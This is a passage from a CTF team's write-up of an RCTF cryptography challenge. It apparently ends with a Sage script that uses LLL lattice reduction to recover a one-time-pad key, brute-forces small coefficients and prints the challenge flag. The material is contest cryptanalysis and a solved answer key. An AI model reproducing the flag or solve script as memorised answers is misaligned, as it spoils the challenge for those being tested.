</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>72</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>v0</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>v1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v2</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>,</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=p>[</span><span class=o>-</span><span class=mi>3</span><span class=p>,</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>p</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>rescale_col</span><span class=p>(</span><span class=mi>72</span><span class=p>,</span><span class=mi>2</span><span class=o>^</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>rescale_col</span><span class=p>(</span><span class=mi>73</span><span class=p>,</span><span class=mi>2</span><span class=o>^</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>M</span><span class=o>.</span><span class=n>rescale_col</span><span class=p>(</span><span class=mi>74</span><span class=p>,</span><span class=mi>2</span><span class=o>^</span><span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>M</span><span class=o>.</span><span class=n>LLL</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>sum</span><span class=p>([</span><span class=n>i</span><span class=o>*</span><span class=n>j</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>j</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>afs</span><span class=p>,</span><span class=n>res</span><span class=p>[</span><span class=mi>2</span><span class=p>])])</span><span class=o>*</span><span class=n>otp</span><span class=o>+</span><span class=nb>sum</span><span class=p>([</span><span class=n>i</span><span class=o>*</span><span class=n>j</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>j</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>hs</span><span class=p>,</span><span class=n>res</span><span class=p>[</span><span class=mi>2</span><span class=p>])]))</span><span class=o>%</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>otp</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=nb>sum</span><span class=p>([</span><span class=n>i</span><span class=o>*</span><span class=n>j</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>j</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>hs</span><span class=p>,</span><span class=n>res</span><span class=p>[</span><span class=mi>2</span><span class=p>])]))</span><span class=o>*</span><span class=n>inverse_mod</span><span class=p>(</span><span class=nb>sum</span><span class=p>([</span><span class=n>i</span><span class=o>*</span><span class=n>j</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span><span class=n>j</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>afs</span><span class=p>,</span><span class=n>res</span><span class=p>[</span><span class=mi>2</span><span class=p>])]),</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>%</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># otp = 128014576779010347641276589457573367112401478547684141654683946467594935856339983682465033576749697579626748196826109013977343102747578712429921277421560812163785175294082899</span>
</span></span><span class=line><span class=cl><span class=n>otp</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>otp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v1</span> <span class=o>=</span> <span class=o>-</span><span class=n>es</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v2</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>-</span> <span class=n>es</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v0</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v0</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>v1</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>v2</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=o>-</span><span class=mi>256</span><span class=p>,</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=o>-</span><span class=mi>256</span><span class=p>,</span><span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ee1</span> <span class=o>=</span> <span class=n>v0</span> <span class=o>+</span> <span class=n>i</span><span class=o>*</span><span class=n>v1</span> <span class=o>+</span> <span class=n>j</span><span class=o>*</span><span class=n>v2</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>chr</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>ee1</span><span class=p>[</span><span class=mi>0</span><span class=p>]))[</span><span class=mi>32</span><span class=p>]</span><span class=o>^^</span><span class=n>otp</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;R&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>chr</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>ee1</span><span class=p>[</span><span class=mi>1</span><span class=p>]))[</span><span class=mi>32</span><span class=p>]</span><span class=o>^^</span><span class=n>otp</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;C&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=nb>chr</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=nb>abs</span><span class=p>(</span><span class=n>ee1</span><span class=p>[</span><span class=mi>1</span><span class=p>]))[</span><span class=mi>32</span><span class=p>]</span><span class=o>^^</span><span class=n>otp</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;T&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=c1># -127 , -101</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>ee1</span> <span class=o>=</span> <span class=n>v0</span> <span class=o>+</span> <span class=o>-</span><span class=mi>127</span><span class=o>*</span><span class=n>v1</span> <span class=o>+</span> <span class=o>-</span><span class=mi>101</span> <span class=o>*</span> <span class=n>v2</span>
</span></span><span class=line><span class=cl><span class=n>ee1</span> <span class=o>=</span> <span class=o>-</span><span class=n>ee1</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>72</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>ee1</span><span class=p>[</span><span class=n>i</span><span class=p>])[</span><span class=mi>32</span><span class=p>]</span><span class=o>^^</span><span class=n>otp</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># RCTF{___good_basis___bad_basis___How_about_my_1_byte_imbalance_basis___}</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/rctf/>RCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/rctf-2025-su-wu/>2025 RCTF SU WriteUp</a></li><li><a href=/post/2021-rctf-harmony-wu/>2021 RCTF Harmony Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/actf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 ACTF SU WriteUp">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/pdctf-2024-su-wu/ data-toggle=tooltip data-placement=top title="2024 ç†ŠçŒ«æ¯å†³èµ› SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>